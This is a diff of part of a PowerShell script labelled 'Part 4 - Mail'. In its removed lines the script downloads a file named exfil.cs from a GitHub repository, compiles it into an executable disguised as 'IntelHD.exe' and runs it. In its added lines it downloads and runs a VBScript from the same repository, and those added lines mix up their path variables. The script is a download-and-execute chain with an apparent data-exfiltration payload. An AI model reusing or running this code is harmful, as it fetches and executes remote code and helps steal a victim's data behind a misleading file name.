@@ -30,10 +30,8 @@ invoke-expression $command
 
 
 #Part 4 - Mail
-$my_path_k="D:\exfil.cs"
-$url_k='https://raw.githubusercontent.com/FurqanKhan1/D/master/exfil.cs';
-$b.DownloadFile($url_k, $my_path_k) ;
-$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\IntelHD.exe D:\exfil.cs"
-invoke-expression $command
-$command="cmd /C D:\IntelHD.exe"
+$my_path_m="D:\so.vbs"
+$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
+$b.DownloadFile($url, $my_path) ;
+$command = "cmd /C cscript "+$my_path_m
 invoke-expression $command
